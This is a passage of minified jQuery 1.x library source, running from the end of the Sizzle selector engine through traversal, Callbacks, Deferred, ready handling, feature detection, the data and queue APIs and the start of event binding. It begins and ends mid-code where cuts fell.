                        })).replace(Q, "$1"), c, e > i && wa(a.slice(i, e)), f > e && wa(a = a.slice(e)), f > e && qa(a))
                    }
                    m.push(c)
                }
            return sa(m)
        }
        function xa(a, b) {
            var c = b.length > 0
              , e = a.length > 0
              , f = function(f, g, h, i, k) {
                var l, o, q, r = 0, s = "0", t = f && [], u = [], v = j, x = f || e && d.find.TAG("*", k), y = w += null == v ? 1 : Math.random() || .1, z = x.length;
                for (k && (j = g === n || g || k); s !== z && null != (l = x[s]); s++) {
                    if (e && l) {
                        o = 0,
                        g || l.ownerDocument === n || (m(l),
                        h = !p);
                        while (q = a[o++])
                            if (q(l, g || n, h)) {
                                i.push(l);
                                break
                            }
                        k && (w = y)
                    }
                    c && ((l = !q && l) && r--,
                    f && t.push(l))
                }
                if (r += s,
                c && s !== r) {
                    o = 0;
                    while (q = b[o++])
                        q(t, u, g, h);
                    if (f) {
                        if (r > 0)
                            while (s--)
                                t[s] || u[s] || (u[s] = F.call(i));
                        u = ua(u)
                    }
                    H.apply(i, u),
                    k && !f && u.length > 0 && r + b.length > 1 && fa.uniqueSort(i)
                }
                return k && (w = y,
                j = v),
                t
            };
            return c ? ha(f) : f
        }
        return h = fa.compile = function(a, b) {
            var c, d = [], e = [], f = A[a + " "];
            if (!f) {
                b || (b = g(a)),
                c = b.length;
                while (c--)
                    f = wa(b[c]),
                    f[u] ? d.push(f) : e.push(f);
                f = A(a, xa(e, d)),
                f.selector = a
            }
            return f
        }
        ,
        i = fa.select = function(a, b, e, f) {
            var i, j, k, l, m, n = "function" == typeof a && a, o = !f && g(a = n.selector || a);
            if (e = e || [],
            1 === o.length) {
                if (j = o[0] = o[0].slice(0),
                j.length > 2 && "ID" === (k = j[0]).type && c.getById && 9 === b.nodeType && p && d.relative[j[1].type]) {
                    if (b = (d.find.ID(k.matches[0].replace(ba, ca), b) || [])[0],
                    !b)
                        return e;
                    n && (b = b.parentNode),
                    a = a.slice(j.shift().value.length)
                }
                i = W.needsContext.test(a) ? 0 : j.length;
                while (i--) {
                    if (k = j[i],
                    d.relative[l = k.type])
                        break;
                    if ((m = d.find[l]) && (f = m(k.matches[0].replace(ba, ca), _.test(j[0].type) && oa(b.parentNode) || b))) {
                        if (j.splice(i, 1),
                        a = f.length && qa(j),
                        !a)
                            return H.apply(e, f),
                            e;
                        break
                    }
                }
            }
            return (n || h(a, o))(f, b, !p, e, !b || _.test(a) && oa(b.parentNode) || b),
            e
        }
        ,
        c.sortStable = u.split("").sort(B).join("") === u,
        c.detectDuplicates = !!l,
        m(),
        c.sortDetached = ia(function(a) {
            return 1 & a.compareDocumentPosition(n.createElement("div"))
        }),
        ia(function(a) {
            return a.innerHTML = "<a href='#'></a>",
            "#" === a.firstChild.getAttribute("href")
        }) || ja("type|href|height|width", function(a, b, c) {
            return c ? void 0 : a.getAttribute(b, "type" === b.toLowerCase() ? 1 : 2)
        }),
        c.attributes && ia(function(a) {
            return a.innerHTML = "<input/>",
            a.firstChild.setAttribute("value", ""),
            "" === a.firstChild.getAttribute("value")
        }) || ja("value", function(a, b, c) {
            return c || "input" !== a.nodeName.toLowerCase() ? void 0 : a.defaultValue
        }),
        ia(function(a) {
            return null == a.getAttribute("disabled")
        }) || ja(K, function(a, b, c) {
            var d;
            return c ? void 0 : a[b] === !0 ? b.toLowerCase() : (d = a.getAttributeNode(b)) && d.specified ? d.value : null
        }),
        fa
    }(a);
    n.find = t,
    n.expr = t.selectors,
    n.expr[":"] = n.expr.pseudos,
    n.uniqueSort = n.unique = t.uniqueSort,
    n.text = t.getText,
    n.isXMLDoc = t.isXML,
    n.contains = t.contains;
    var u = function(a, b, c) {
        var d = []
          , e = void 0 !== c;
        while ((a = a[b]) && 9 !== a.nodeType)
            if (1 === a.nodeType) {
                if (e && n(a).is(c))
                    break;
                d.push(a)
            }
        return d
    }
      , v = function(a, b) {
        for (var c = []; a; a = a.nextSibling)
            1 === a.nodeType && a !== b && c.push(a);
        return c
    }
      , w = n.expr.match.needsContext
      , x = /^<([\w-]+)\s*\/?>(?:<\/\1>|)$/
      , y = /^.[^:#\[\.,]*$/;
    function z(a, b, c) {
        if (n.isFunction(b))
            return n.grep(a, function(a, d) {
                return !!b.call(a, d, a) !== c
            });
        if (b.nodeType)
            return n.grep(a, function(a) {
                return a === b !== c
            });
        if ("string" == typeof b) {
            if (y.test(b))
                return n.filter(b, a, c);
            b = n.filter(b, a)
        }
        return n.grep(a, function(a) {
            return n.inArray(a, b) > -1 !== c
        })
    }
    n.filter = function(a, b, c) {
        var d = b[0];
        return c && (a = ":not(" + a + ")"),
        1 === b.length && 1 === d.nodeType ? n.find.matchesSelector(d, a) ? [d] : [] : n.find.matches(a, n.grep(b, function(a) {
            return 1 === a.nodeType
        }))
    }
    ,
    n.fn.extend({
        find: function(a) {
            var b, c = [], d = this, e = d.length;
            if ("string" != typeof a)
                return this.pushStack(n(a).filter(function() {
                    for (b = 0; e > b; b++)
                        if (n.contains(d[b], this))
                            return !0
                }));
            for (b = 0; e > b; b++)
                n.find(a, d[b], c);
            return c = this.pushStack(e > 1 ? n.unique(c) : c),
            c.selector = this.selector ? this.selector + " " + a : a,
            c
        },
        filter: function(a) {
            return this.pushStack(z(this, a || [], !1))
        },
        not: function(a) {
            return this.pushStack(z(this, a || [], !0))
        },
        is: function(a) {
            return !!z(this, "string" == typeof a && w.test(a) ? n(a) : a || [], !1).length
        }
    });
    var A, B = /^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]*))$/, C = n.fn.init = function(a, b, c) {
        var e, f;
        if (!a)
            return this;
        if (c = c || A,
        "string" == typeof a) {
            if (e = "<" === a.charAt(0) && ">" === a.charAt(a.length - 1) && a.length >= 3 ? [null, a, null] : B.exec(a),
            !e || !e[1] && b)
                return !b || b.jquery ? (b || c).find(a) : this.constructor(b).find(a);
            if (e[1]) {
                if (b = b instanceof n ? b[0] : b,
                n.merge(this, n.parseHTML(e[1], b && b.nodeType ? b.ownerDocument || b : d, !0)),
                x.test(e[1]) && n.isPlainObject(b))
                    for (e in b)
                        n.isFunction(this[e]) ? this[e](b[e]) : this.attr(e, b[e]);
                return this
            }
            if (f = d.getElementById(e[2]),
            f && f.parentNode) {
                if (f.id !== e[2])
                    return A.find(a);
                this.length = 1,
                this[0] = f
            }
            return this.context = d,
            this.selector = a,
            this
        }
        return a.nodeType ? (this.context = this[0] = a,
        this.length = 1,
        this) : n.isFunction(a) ? "undefined" != typeof c.ready ? c.ready(a) : a(n) : (void 0 !== a.selector && (this.selector = a.selector,
        this.context = a.context),
        n.makeArray(a, this))
    }
    ;
    C.prototype = n.fn,
    A = n(d);
    var D = /^(?:parents|prev(?:Until|All))/
      , E = {
        children: !0,
        contents: !0,
        next: !0,
        prev: !0
    };
    n.fn.extend({
        has: function(a) {
            var b, c = n(a, this), d = c.length;
            return this.filter(function() {
                for (b = 0; d > b; b++)
                    if (n.contains(this, c[b]))
                        return !0
            })
        },
        closest: function(a, b) {
            for (var c, d = 0, e = this.length, f = [], g = w.test(a) || "string" != typeof a ? n(a, b || this.context) : 0; e > d; d++)
                for (c = this[d]; c && c !== b; c = c.parentNode)
                    if (c.nodeType < 11 && (g ? g.index(c) > -1 : 1 === c.nodeType && n.find.matchesSelector(c, a))) {
                        f.push(c);
                        break
                    }
            return this.pushStack(f.length > 1 ? n.uniqueSort(f) : f)
        },
        index: function(a) {
            return a ? "string" == typeof a ? n.inArray(this[0], n(a)) : n.inArray(a.jquery ? a[0] : a, this) : this[0] && this[0].parentNode ? this.first().prevAll().length : -1
        },
        add: function(a, b) {
            return this.pushStack(n.uniqueSort(n.merge(this.get(), n(a, b))))
        },
        addBack: function(a) {
            return this.add(null == a ? this.prevObject : this.prevObject.filter(a))
        }
    });
    function F(a, b) {
        do
            a = a[b];
        while (a && 1 !== a.nodeType);return a
    }
    n.each({
        parent: function(a) {
            var b = a.parentNode;
            return b && 11 !== b.nodeType ? b : null
        },
        parents: function(a) {
            return u(a, "parentNode")
        },
        parentsUntil: function(a, b, c) {
            return u(a, "parentNode", c)
        },
        next: function(a) {
            return F(a, "nextSibling")
        },
        prev: function(a) {
            return F(a, "previousSibling")
        },
        nextAll: function(a) {
            return u(a, "nextSibling")
        },
        prevAll: function(a) {
            return u(a, "previousSibling")
        },
        nextUntil: function(a, b, c) {
            return u(a, "nextSibling", c)
        },
        prevUntil: function(a, b, c) {
            return u(a, "previousSibling", c)
        },
        siblings: function(a) {
            return v((a.parentNode || {}).firstChild, a)
        },
        children: function(a) {
            return v(a.firstChild)
        },
        contents: function(a) {
            return n.nodeName(a, "iframe") ? a.contentDocument || a.contentWindow.document : n.merge([], a.childNodes)
        }
    }, function(a, b) {
        n.fn[a] = function(c, d) {
            var e = n.map(this, b, c);
            return "Until" !== a.slice(-5) && (d = c),
            d && "string" == typeof d && (e = n.filter(d, e)),
            this.length > 1 && (E[a] || (e = n.uniqueSort(e)),
            D.test(a) && (e = e.reverse())),
            this.pushStack(e)
        }
    });
    var G = /\S+/g;
    function H(a) {
        var b = {};
        return n.each(a.match(G) || [], function(a, c) {
            b[c] = !0
        }),
        b
    }
    n.Callbacks = function(a) {
        a = "string" == typeof a ? H(a) : n.extend({}, a);
        var b, c, d, e, f = [], g = [], h = -1, i = function() {
            for (e = a.once,
            d = b = !0; g.length; h = -1) {
                c = g.shift();
                while (++h < f.length)
                    f[h].apply(c[0], c[1]) === !1 && a.stopOnFalse && (h = f.length,
                    c = !1)
            }
            a.memory || (c = !1),
            b = !1,
            e && (f = c ? [] : "")
        }, j = {
            add: function() {
                return f && (c && !b && (h = f.length - 1,
                g.push(c)),
                function d(b) {
                    n.each(b, function(b, c) {
                        n.isFunction(c) ? a.unique && j.has(c) || f.push(c) : c && c.length && "string" !== n.type(c) && d(c)
                    })
                }(arguments),
                c && !b && i()),
                this
            },
            remove: function() {
                return n.each(arguments, function(a, b) {
                    var c;
                    while ((c = n.inArray(b, f, c)) > -1)
                        f.splice(c, 1),
                        h >= c && h--
                }),
                this
            },
            has: function(a) {
                return a ? n.inArray(a, f) > -1 : f.length > 0
            },
            empty: function() {
                return f && (f = []),
                this
            },
            disable: function() {
                return e = g = [],
                f = c = "",
                this
            },
            disabled: function() {
                return !f
            },
            lock: function() {
                return e = !0,
                c || j.disable(),
                this
            },
            locked: function() {
                return !!e
            },
            fireWith: function(a, c) {
                return e || (c = c || [],
                c = [a, c.slice ? c.slice() : c],
                g.push(c),
                b || i()),
                this
            },
            fire: function() {
                return j.fireWith(this, arguments),
                this
            },
            fired: function() {
                return !!d
            }
        };
        return j
    }
    ,
    n.extend({
        Deferred: function(a) {
            var b = [["resolve", "done", n.Callbacks("once memory"), "resolved"], ["reject", "fail", n.Callbacks("once memory"), "rejected"], ["notify", "progress", n.Callbacks("memory")]]
              , c = "pending"
              , d = {
                state: function() {
                    return c
                },
                always: function() {
                    return e.done(arguments).fail(arguments),
                    this
                },
                then: function() {
                    var a = arguments;
                    return n.Deferred(function(c) {
                        n.each(b, function(b, f) {
                            var g = n.isFunction(a[b]) && a[b];
                            e[f[1]](function() {
                                var a = g && g.apply(this, arguments);
                                a && n.isFunction(a.promise) ? a.promise().progress(c.notify).done(c.resolve).fail(c.reject) : c[f[0] + "With"](this === d ? c.promise() : this, g ? [a] : arguments)
                            })
                        }),
                        a = null
                    }).promise()
                },
                promise: function(a) {
                    return null != a ? n.extend(a, d) : d
                }
            }
              , e = {};
            return d.pipe = d.then,
            n.each(b, function(a, f) {
                var g = f[2]
                  , h = f[3];
                d[f[1]] = g.add,
                h && g.add(function() {
                    c = h
                }, b[1 ^ a][2].disable, b[2][2].lock),
                e[f[0]] = function() {
                    return e[f[0] + "With"](this === e ? d : this, arguments),
                    this
                }
                ,
                e[f[0] + "With"] = g.fireWith
            }),
            d.promise(e),
            a && a.call(e, e),
            e
        },
        when: function(a) {
            var b = 0, c = e.call(arguments), d = c.length, f = 1 !== d || a && n.isFunction(a.promise) ? d : 0, g = 1 === f ? a : n.Deferred(), h = function(a, b, c) {
                return function(d) {
                    b[a] = this,
                    c[a] = arguments.length > 1 ? e.call(arguments) : d,
                    c === i ? g.notifyWith(b, c) : --f || g.resolveWith(b, c)
                }
            }, i, j, k;
            if (d > 1)
                for (i = new Array(d),
                j = new Array(d),
                k = new Array(d); d > b; b++)
                    c[b] && n.isFunction(c[b].promise) ? c[b].promise().progress(h(b, j, i)).done(h(b, k, c)).fail(g.reject) : --f;
            return f || g.resolveWith(k, c),
            g.promise()
        }
    });
    var I;
    n.fn.ready = function(a) {
        return n.ready.promise().done(a),
        this
    }
    ,
    n.extend({
        isReady: !1,
        readyWait: 1,
        holdReady: function(a) {
            a ? n.readyWait++ : n.ready(!0)
        },
        ready: function(a) {
            (a === !0 ? --n.readyWait : n.isReady) || (n.isReady = !0,
            a !== !0 && --n.readyWait > 0 || (I.resolveWith(d, [n]),
            n.fn.triggerHandler && (n(d).triggerHandler("ready"),
            n(d).off("ready"))))
        }
    });
    function J() {
        d.addEventListener ? (d.removeEventListener("DOMContentLoaded", K),
        a.removeEventListener("load", K)) : (d.detachEvent("onreadystatechange", K),
        a.detachEvent("onload", K))
    }
    function K() {
        (d.addEventListener || "load" === a.event.type || "complete" === d.readyState) && (J(),
        n.ready())
    }
    n.ready.promise = function(b) {
        if (!I)
            if (I = n.Deferred(),
            "complete" === d.readyState || "loading" !== d.readyState && !d.documentElement.doScroll)
                a.setTimeout(n.ready);
            else if (d.addEventListener)
                d.addEventListener("DOMContentLoaded", K),
                a.addEventListener("load", K);
            else {
                d.attachEvent("onreadystatechange", K),
                a.attachEvent("onload", K);
                var c = !1;
                try {
                    c = null == a.frameElement && d.documentElement
                } catch (e) {}
                c && c.doScroll && !function f() {
                    if (!n.isReady) {
                        try {
                            c.doScroll("left")
                        } catch (b) {
                            return a.setTimeout(f, 50)
                        }
                        J(),
                        n.ready()
                    }
                }()
            }
        return I.promise(b)
    }
    ,
    n.ready.promise();
    var L;
    for (L in n(l))
        break;
    l.ownFirst = "0" === L,
    l.inlineBlockNeedsLayout = !1,
    n(function() {
        var a, b, c, e;
        c = d.getElementsByTagName("body")[0],
        c && c.style && (b = d.createElement("div"),
        e = d.createElement("div"),
        e.style.cssText = "position:absolute;border:0;width:0;height:0;top:0;left:-9999px",
        c.appendChild(e).appendChild(b),
        "undefined" != typeof b.style.zoom && (b.style.cssText = "display:inline;margin:0;border:0;padding:1px;width:1px;zoom:1",
        l.inlineBlockNeedsLayout = a = 3 === b.offsetWidth,
        a && (c.style.zoom = 1)),
        c.removeChild(e))
    }),
    function() {
        var a = d.createElement("div");
        l.deleteExpando = !0;
        try {
            delete a.test
        } catch (b) {
            l.deleteExpando = !1
        }
        a = null
    }();
    var M = function(a) {
        var b = n.noData[(a.nodeName + " ").toLowerCase()]
          , c = +a.nodeType || 1;
        return 1 !== c && 9 !== c ? !1 : !b || b !== !0 && a.getAttribute("classid") === b
    }
      , N = /^(?:\{[\w\W]*\}|\[[\w\W]*\])$/
      , O = /([A-Z])/g;
    function P(a, b, c) {
        if (void 0 === c && 1 === a.nodeType) {
            var d = "data-" + b.replace(O, "-$1").toLowerCase();
            if (c = a.getAttribute(d),
            "string" == typeof c) {
                try {
                    c = "true" === c ? !0 : "false" === c ? !1 : "null" === c ? null : +c + "" === c ? +c : N.test(c) ? n.parseJSON(c) : c
                } catch (e) {}
                n.data(a, b, c)
            } else
                c = void 0;
        }
        return c
    }
    function Q(a) {
        var b;
        for (b in a)
            if (("data" !== b || !n.isEmptyObject(a[b])) && "toJSON" !== b)
                return !1;
        return !0
    }
    function R(a, b, d, e) {
        if (M(a)) {
            var f, g, h = n.expando, i = a.nodeType, j = i ? n.cache : a, k = i ? a[h] : a[h] && h;
            if (k && j[k] && (e || j[k].data) || void 0 !== d || "string" != typeof b)
                return k || (k = i ? a[h] = c.pop() || n.guid++ : h),
                j[k] || (j[k] = i ? {} : {
                    toJSON: n.noop
                }),
                "object" != typeof b && "function" != typeof b || (e ? j[k] = n.extend(j[k], b) : j[k].data = n.extend(j[k].data, b)),
                g = j[k],
                e || (g.data || (g.data = {}),
                g = g.data),
                void 0 !== d && (g[n.camelCase(b)] = d),
                "string" == typeof b ? (f = g[b],
                null == f && (f = g[n.camelCase(b)])) : f = g,
                f
        }
    }
    function S(a, b, c) {
        if (M(a)) {
            var d, e, f = a.nodeType, g = f ? n.cache : a, h = f ? a[n.expando] : n.expando;
            if (g[h]) {
                if (b && (d = c ? g[h] : g[h].data)) {
                    n.isArray(b) ? b = b.concat(n.map(b, n.camelCase)) : b in d ? b = [b] : (b = n.camelCase(b),
                    b = b in d ? [b] : b.split(" ")),
                    e = b.length;
                    while (e--)
                        delete d[b[e]];
                    if (c ? !Q(d) : !n.isEmptyObject(d))
                        return
                }
                (c || (delete g[h].data,
                Q(g[h]))) && (f ? n.cleanData([a], !0) : l.deleteExpando || g != g.window ? delete g[h] : g[h] = void 0)
            }
        }
    }
    n.extend({
        cache: {},
        noData: {
            "applet ": !0,
            "embed ": !0,
            "object ": "clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"
        },
        hasData: function(a) {
            return a = a.nodeType ? n.cache[a[n.expando]] : a[n.expando],
            !!a && !Q(a)
        },
        data: function(a, b, c) {
            return R(a, b, c)
        },
        removeData: function(a, b) {
            return S(a, b)
        },
        _data: function(a, b, c) {
            return R(a, b, c, !0)
        },
        _removeData: function(a, b) {
            return S(a, b, !0)
        }
    }),
    n.fn.extend({
        data: function(a, b) {
            var c, d, e, f = this[0], g = f && f.attributes;
            if (void 0 === a) {
                if (this.length && (e = n.data(f),
                1 === f.nodeType && !n._data(f, "parsedAttrs"))) {
                    c = g.length;
                    while (c--)
                        g[c] && (d = g[c].name,
                        0 === d.indexOf("data-") && (d = n.camelCase(d.slice(5)),
                        P(f, d, e[d])));
                    n._data(f, "parsedAttrs", !0)
                }
                return e
            }
            return "object" == typeof a ? this.each(function() {
                n.data(this, a)
            }) : arguments.length > 1 ? this.each(function() {
                n.data(this, a, b)
            }) : f ? P(f, a, n.data(f, a)) : void 0
        },
        removeData: function(a) {
            return this.each(function() {
                n.removeData(this, a)
            })
        }
    }),
    n.extend({
        queue: function(a, b, c) {
            var d;
            return a ? (b = (b || "fx") + "queue",
            d = n._data(a, b),
            c && (!d || n.isArray(c) ? d = n._data(a, b, n.makeArray(c)) : d.push(c)),
            d || []) : void 0
        },
        dequeue: function(a, b) {
            b = b || "fx";
            var c = n.queue(a, b)
              , d = c.length
              , e = c.shift()
              , f = n._queueHooks(a, b)
              , g = function() {
                n.dequeue(a, b)
            };
            "inprogress" === e && (e = c.shift(),
            d--),
            e && ("fx" === b && c.unshift("inprogress"),
            delete f.stop,
            e.call(a, g, f)),
            !d && f && f.empty.fire()
        },
        _queueHooks: function(a, b) {
            var c = b + "queueHooks";
            return n._data(a, c) || n._data(a, c, {
                empty: n.Callbacks("once memory").add(function() {
                    n._removeData(a, b + "queue"),
                    n._removeData(a, c)
                })
            })
        }
    }),
    n.fn.extend({
        queue: function(a, b) {
            var c = 2;
            return "string" != typeof a && (b = a,
            a = "fx",
            c--),
            arguments.length < c ? n.queue(this[0], a) : void 0 === b ? this : this.each(function() {
                var c = n.queue(this, a, b);
                n._queueHooks(this, a),
                "fx" === a && "inprogress" !== c[0] && n.dequeue(this, a)
            })
        },
        dequeue: function(a) {
            return this.each(function() {
                n.dequeue(this, a)
            })
        },
        clearQueue: function(a) {
            return this.queue(a || "fx", [])
        },
        promise: function(a, b) {
            var c, d = 1, e = n.Deferred(), f = this, g = this.length, h = function() {
                --d || e.resolveWith(f, [f])
            };
            "string" != typeof a && (b = a,
            a = void 0),
            a = a || "fx";
            while (g--)
                c = n._data(f[g], a + "queueHooks"),
                c && c.empty && (d++,
                c.empty.add(h));
            return h(),
            e.promise(b)
        }
    }),
    function() {
        var a;
        l.shrinkWrapBlocks = function() {
            if (null != a)
                return a;
            a = !1;
            var b, c, e;
            return c = d.getElementsByTagName("body")[0],
            c && c.style ? (b = d.createElement("div"),
            e = d.createElement("div"),
            e.style.cssText = "position:absolute;border:0;width:0;height:0;top:0;left:-9999px",
            c.appendChild(e).appendChild(b),
            "undefined" != typeof b.style.zoom && (b.style.cssText = "-webkit-box-sizing:content-box;-moz-box-sizing:content-box;box-sizing:content-box;display:block;margin:0;border:0;padding:1px;width:1px;zoom:1",
            b.appendChild(d.createElement("div")).style.width = "5px",
            a = 3 !== b.offsetWidth),
            c.removeChild(e),
            a) : void 0
        }
    }();
    var T = /[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source
      , U = new RegExp("^(?:([+-])=|)(" + T + ")([a-z%]*)$","i")
      , V = ["Top", "Right", "Bottom", "Left"]
      , W = function(a, b) {
        return a = b || a,
        "none" === n.css(a, "display") || !n.contains(a.ownerDocument, a)
    };
    function X(a, b, c, d) {
        var e, f = 1, g = 20, h = d ? function() {
            return d.cur()
        }
        : function() {
            return n.css(a, b, "")
        }
        , i = h(), j = c && c[3] || (n.cssNumber[b] ? "" : "px"), k = (n.cssNumber[b] || "px" !== j && +i) && U.exec(n.css(a, b));
        if (k && k[3] !== j) {
            j = j || k[3],
            c = c || [],
            k = +i || 1;
            do
                f = f || ".5",
                k /= f,
                n.style(a, b, k + j);
            while (f !== (f = h() / i) && 1 !== f && --g)
        }
        return c && (k = +k || +i || 0,
        e = c[1] ? k + (c[1] + 1) * c[2] : +c[2],
        d && (d.unit = j,
        d.start = k,
        d.end = e)),
        e
    }
    var Y = function(a, b, c, d, e, f, g) {
        var h = 0
          , i = a.length
          , j = null == c;
        if ("object" === n.type(c)) {
            e = !0;
            for (h in c)
                Y(a, b, h, c[h], !0, f, g)
        } else if (void 0 !== d && (e = !0,
        n.isFunction(d) || (g = !0),
        j && (g ? (b.call(a, d),
        b = null) : (j = b,
        b = function(a, b, c) {
            return j.call(n(a), c)
        }
        )),
        b))
            for (; i > h; h++)
                b(a[h], c, g ? d : d.call(a[h], h, b(a[h], c)));
        return e ? a : j ? b.call(a) : i ? b(a[0], c) : f
    }
      , Z = /^(?:checkbox|radio)$/i
      , $ = /<([\w:-]+)/
      , _ = /^$|\/(?:java|ecma)script/i
      , aa = /^\s+/
      , ba = "abbr|article|aside|audio|bdi|canvas|data|datalist|details|dialog|figcaption|figure|footer|header|hgroup|main|mark|meter|nav|output|picture|progress|section|summary|template|time|video";
    function ca(a) {
        var b = ba.split("|")
          , c = a.createDocumentFragment();
        if (c.createElement)
            while (b.length)
                c.createElement(b.pop());
        return c
    }
    !function() {
        var a = d.createElement("div")
          , b = d.createDocumentFragment()
          , c = d.createElement("input");
        a.innerHTML = "  <link/><table></table><a href='/a'>a</a><input type='checkbox'/>",
        l.leadingWhitespace = 3 === a.firstChild.nodeType,
        l.tbody = !a.getElementsByTagName("tbody").length,
        l.htmlSerialize = !!a.getElementsByTagName("link").length,
        l.html5Clone = "<:nav></:nav>" !== d.createElement("nav").cloneNode(!0).outerHTML,
        c.type = "checkbox",
        c.checked = !0,
        b.appendChild(c),
        l.appendChecked = c.checked,
        a.innerHTML = "<textarea>x</textarea>",
        l.noCloneChecked = !!a.cloneNode(!0).lastChild.defaultValue,
        b.appendChild(a),
        c = d.createElement("input"),
        c.setAttribute("type", "radio"),
        c.setAttribute("checked", "checked"),
        c.setAttribute("name", "t"),
        a.appendChild(c),
        l.checkClone = a.cloneNode(!0).cloneNode(!0).lastChild.checked,
        l.noCloneEvent = !!a.addEventListener,
        a[n.expando] = 1,
        l.attributes = !a.getAttribute(n.expando)
    }();
    var da = {
        option: [1, "<select multiple='multiple'>", "</select>"],
        legend: [1, "<fieldset>", "</fieldset>"],
        area: [1, "<map>", "</map>"],
        param: [1, "<object>", "</object>"],
        thead: [1, "<table>", "</table>"],
        tr: [2, "<table><tbody>", "</tbody></table>"],
        col: [2, "<table><tbody></tbody><colgroup>", "</colgroup></table>"],
        td: [3, "<table><tbody><tr>", "</tr></tbody></table>"],
        _default: l.htmlSerialize ? [0, "", ""] : [1, "X<div>", "</div>"]
    };
    da.optgroup = da.option,
    da.tbody = da.tfoot = da.colgroup = da.caption = da.thead,
    da.th = da.td;
    function ea(a, b) {
        var c, d, e = 0, f = "undefined" != typeof a.getElementsByTagName ? a.getElementsByTagName(b || "*") : "undefined" != typeof a.querySelectorAll ? a.querySelectorAll(b || "*") : void 0;
        if (!f)
            for (f = [],
            c = a.childNodes || a; null != (d = c[e]); e++)
                !b || n.nodeName(d, b) ? f.push(d) : n.merge(f, ea(d, b));
        return void 0 === b || b && n.nodeName(a, b) ? n.merge([a], f) : f
    }
    function fa(a, b) {
        for (var c, d = 0; null != (c = a[d]); d++)
            n._data(c, "globalEval", !b || n._data(b[d], "globalEval"))
    }
    var ga = /<|&#?\w+;/
      , ha = /<tbody/i;
    function ia(a) {
        Z.test(a.type) && (a.defaultChecked = a.checked)
    }
    function ja(a, b, c, d, e) {
        for (var f, g, h, i, j, k, m, o = a.length, p = ca(b), q = [], r = 0; o > r; r++)
            if (g = a[r],
            g || 0 === g)
                if ("object" === n.type(g))
                    n.merge(q, g.nodeType ? [g] : g);
                else if (ga.test(g)) {
                    i = i || p.appendChild(b.createElement("div")),
                    j = ($.exec(g) || ["", ""])[1].toLowerCase(),
                    m = da[j] || da._default,
                    i.innerHTML = m[1] + n.htmlPrefilter(g) + m[2],
                    f = m[0];
                    while (f--)
                        i = i.lastChild;
                    if (!l.leadingWhitespace && aa.test(g) && q.push(b.createTextNode(aa.exec(g)[0])),
                    !l.tbody) {
                        g = "table" !== j || ha.test(g) ? "<table>" !== m[1] || ha.test(g) ? 0 : i : i.firstChild,
                        f = g && g.childNodes.length;
                        while (f--)
                            n.nodeName(k = g.childNodes[f], "tbody") && !k.childNodes.length && g.removeChild(k)
                    }
                    n.merge(q, i.childNodes),
                    i.textContent = "";
                    while (i.firstChild)
                        i.removeChild(i.firstChild);
                    i = p.lastChild
                } else
                    q.push(b.createTextNode(g));
        i && p.removeChild(i),
        l.appendChecked || n.grep(ea(q, "input"), ia),
        r = 0;
        while (g = q[r++])
            if (d && n.inArray(g, d) > -1)
                e && e.push(g);
            else if (h = n.contains(g.ownerDocument, g),
            i = ea(p.appendChild(g), "script"),
            h && fa(i),
            c) {
                f = 0;
                while (g = i[f++])
                    _.test(g.type || "") && c.push(g)
            }
        return i = null,
        p
    }
    !function() {
        var b, c, e = d.createElement("div");
        for (b in {
            submit: !0,
            change: !0,
            focusin: !0
        })
            c = "on" + b,
            (l[b] = c in a) || (e.setAttribute(c, "t"),
            l[b] = e.attributes[c].expando === !1);
        e = null
    }();
    var ka = /^(?:input|select|textarea)$/i
      , la = /^key/
      , ma = /^(?:mouse|pointer|contextmenu|drag|drop)|click/
      , na = /^(?:focusinfocus|focusoutblur)$/
      , oa = /^([^.]*)(?:\.(.+)|)/;
    function pa() {
        return !0
    }
    function qa() {
        return !1
    }
    function ra() {
        try {
            return d.activeElement
        } catch (a) {}
    }
    function sa(a, b, c, d, e, f) {
        var g, h;
        if ("object" == typeof b) {
            "string" != typeof c && (d = d || c,
            c = void 0);
            for (h in b)
                sa(a, h, c, d, b[h], f);
            return a
        }
        if (null == d && null == e ? (e = c,
        d = c = void 0) : null == e && ("string" == typeof c ? (e = d,
        d = void 0) : (e = d,
        d = c,
        c = void 0)),
        e === !1)
            e = qa;
        else if (!e)
            return a;
        return 1 === f && (g = e,
        e = function(a) {
            return n().off(a),
            g.apply(this, arguments)
        }
        ,
        e.guid = g.guid || (g.guid = n.guid++)),
        a.each(function() {
            n.event.add(this, b, e, d, c)
        })
    }
    n.event = {
        global: {},
        add: function(a, b, c, d, e) {
            var f, g, h, i, j, k, l, m, o, p, q, r = n._data(a);
            if (r) {
                c.handler && (i = c,
                c = i.handler,
                e = i.selector),
                c.guid || (c.guid = n.guid++),
                (g = r.events) || (g = r.events = {}),
                (k = r.handle) || (k = r.handle = function(a) {
                    return "undefined" == typeof n || a && n.event.triggered === a.type ? void 0 : n.event.dispatch.apply(k.elem, arguments)
                }
                ,
                k.elem = a),
                b = (b || "").match(G) || [""],
                h = b.length;
                while (h--)
                    f = oa.exec(b[h]) || [],
                    o = q = f[1],
                    p = (f[2] || "").split(".").sort(),
                    o && (j = n.event.special[o] || {},
                    o = (e ? j.delegateType : j.bindType) || o,
                    j = n.event.special[o] || {},
                    l = n.extend({
                        type: o,
                        origType: q,
                        data: d,
                        handler: c,
                        guid: c.guid,
                        selector: e,
                        needsContext: e && n.expr.match.needsContext.test(e),
                        namespace: p.join(".")
                    }, i),
                    (m = g[o]) || (m = g[o] = [],
                    m.delegateCount = 0,
                    j.setup && j.setup.call(a, d, p, k) !== !1 || (a.addEventListener ? a.addEventListener(o, k, !1) : a.attachEvent && a.attachEvent("on" + o, k))),
                    j.add && (j.add.call(a, l),
                    l.handler.guid || (l.handler.guid = c.guid)),
                    e ? m.splice(m.delegateCount++, 0, l) : m.push(l),
                    n.event.global[o] = !0);
                a = null
            }
        },
        remove: function(a, b, c, d, e) {
            var f, g, h, i, j, k, l, m, o, p, q, r = n.hasData(a) && n._data(a);
            if (r && (k = r.events)) {
                b = (b || "").match(G) || [""],
                j = b.length;
                while (j--)
                    if (h = oa.exec(b[j]) || [],
                    o = q = h[1],
                    p = (h[2] || "").split(".").sort(),
                    o) {
                        l = n.event.special[o] || {},
                        o = (d ? l.delegateType : l.bindType) || o,
                        m = k[o] || [],
                        h = h[2] && new RegExp("(^|\\.)" + p.join("\\.(?:.*\\.|)") + "(\\.|$)"),
                        i = f = m.length;
                        while (f--)
                            g = m[f],
                            !e && q !== g.origType || c && c.guid !== g.guid || h && !h.test(g.namespace) || d && d !== g.selector && ("**" !== d || !g.selector) || (m.splice(f, 1),
                            g.selector && m.delegateCount--,
